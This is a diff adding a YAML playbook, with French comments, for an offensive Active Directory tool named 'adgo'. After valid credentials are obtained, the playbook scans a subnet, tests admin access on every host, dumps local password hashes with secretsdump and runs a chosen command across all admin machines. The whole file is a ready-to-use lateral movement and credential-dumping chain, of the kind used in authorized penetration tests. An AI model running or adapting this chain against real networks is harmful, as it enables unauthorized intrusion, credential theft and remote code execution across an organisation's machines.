@@ -1,0 +1,53 @@
+# ADgo Playbook — Lateral Movement Chain
+# ============================================================
+# Après avoir obtenu des credentials valides :
+#   1. Tester l'accès admin sur tout le réseau
+#   2. Dumper les hashes locaux sur les machines admin
+#   3. Exécuter une commande sur toutes les machines admin
+#
+# Usage :
+#   adgo playbook run lateral-movement.yaml \
+#     -v SUBNET=192.168.1.0/24 DOMAIN=lab.local USERNAME=admin PASSWORD=pass EXEC_CMD="whoami /all"
+
+id: lateral-movement
+name: Lateral Movement Chain
+description: Scan subnet → test admin access → secretsdump → exec command
+author: adgo
+tags: [lateral, smb, exec, secretsdump]
+version: "1.0"
+
+env:
+  subnet: "{{SUBNET}}"
+  domain: "{{DOMAIN}}"
+  username: "{{USERNAME}}"
+  password: "{{PASSWORD}}"
+  hash: "{{HASH}}"
+  exec_cmd: "{{EXEC_CMD}}"
+  output_dir: "./lateral_{{domain}}"
+
+steps:
+  - id: autopwn
+    name: Scan and authenticate on all hosts
+    description: Find admin hosts across the subnet
+    type: adgo
+    command: autopwn
+    args:
+      username: "{{username}}"
+      password: "{{password}}"
+      domain: "{{domain}}"
+      exec: "{{exec_cmd}}"
+      session: "true"
+      log-file: "{{output_dir}}/autopwn.jsonl"
+    on_failure: continue
+
+  - id: secretsdump-targets
+    name: Custom secretsdump targets
+    description: Run secretsdump on specific additional targets if defined
+    type: adgo
+    command: smb secretsdump
+    args:
+      username: "{{username}}"
+      password: "{{password}}"
+      domain: "{{domain}}"
+    on_failure: continue
+    disabled: true  # Activer si vous avez une cible spécifique
